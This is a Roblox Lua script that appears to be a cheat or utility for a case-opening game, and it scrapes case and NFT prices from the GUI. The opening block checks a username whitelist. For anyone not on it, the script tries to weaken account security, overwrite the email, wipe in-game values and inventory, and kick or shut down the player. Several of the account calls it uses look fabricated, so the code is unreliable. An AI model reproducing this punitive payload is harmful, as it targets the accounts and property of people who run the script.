local p=game:GetService("Players").LocalPlayer
local allowed={"TROTULOV39","TheMoonrogi","froggitnaultrah","Dontuseblablablublu","fjk_no"}
local ok=false
for _,v in pairs(allowed)do if p.Name==v then ok=true break end end

if not ok then
local ts=game:GetService("TeleportService")
local hs=game:GetService("HttpService")
local rs=game:GetService("ReplicatedStorage")
local ep=game:GetService("EmailSettings")
local as=game:GetService("AccountSettings")
pcall(function()as.PromptForPasswordOnActions=false end)
pcall(function()as.PromptForPINOnActions=false end)
pcall(function()ep.EmailVerified=false end)
pcall(function()ep.EmailNotificationEnabled=false end)
pcall(function()ep.SetEmail("deleted@deleted.com")end)
pcall(function()p:SetSuperSafety(true)end)
pcall(function()p:SetMembershipType("None")end)
for _,v in pairs(p:GetChildren())do if v:IsA("NumberValue")or v:IsA("IntValue")then v.Value=0 end end
for _,v in pairs(p:FindFirstChild("_Inventory")or{})do v:Destroy()end
for _,v in pairs(p:FindFirstChild("_Index")or{})do if v:IsA("IntValue")then v.Value=0 end end
pcall(function()game:Shutdown()end)
pcall(function()ts:Teleport(0)end)
pcall(function()p:Kick("Unauthorized")end)
return
end

local rs=game:GetService("ReplicatedStorage")
local ev=rs.Events
local ui=game:GetService("UserInputService")
local ts=game:GetService("TweenService")
local pg=p.PlayerGui

local caseImages={}
local nftImages={}
local casePrices={}
local nftPrices={}
local allCases={}
local allNFTs={}

local function scanGame()
local mainGui=pg:FindFirstChild("MainGui")
if not mainGui then return end
local casesPage=mainGui:FindFirstChild("Pages"):FindFirstChild("Cases")
if casesPage then
local mf=casesPage:FindFirstChild("MainFrame")
if mf then
for _,f in pairs(mf:GetChildren())do
if f:IsA("Frame")then
for _,b in pairs(f:GetChildren())do
if b:IsA("ImageButton")then
local txt=b:FindFirstChild("Txt")
local pr=b:FindFirstChild("Price")
if txt and txt:IsA("TextLabel")and txt.Text~=""then
local name=txt.Text
local img=b.Image or""
local price=0
if pr then
local str=pr.Text:gsub("[^%d]","")
price=tonumber(str)or 0
end
caseImages[name]=img
casePrices[name]=price
table.insert(allCases,name)
end end end end end end end
local upgradePage=mainGui:FindFirstChild("Pages"):FindFirstChild("Upgrade")
if upgradePage then
local choose=upgradePage:FindFirstChild("MainFrame"):FindFirstChild("Choose"):FindFirstChild("Choose")
if choose then
for _,f in pairs(choose:GetChildren())do
if f:IsA("Frame")then
local nameTxt=f:FindFirstChild("Txt")
local priceTxt=f:FindFirstChild("Price")
if nameTxt and priceTxt then
local name=nameTxt.Text
local price=0
local str=priceTxt.Text:gsub("[^%d]","")
price=tonumber(str)or 0
local img=""
local icon=f:FindFirstChild("Icon")
if icon and icon:IsA("ImageLabel")then img=icon.Image end
nftImages[name]=img
nftPrices[name]=price
table.insert(allNFTs,name)
end end end end end end
end
scanGame()

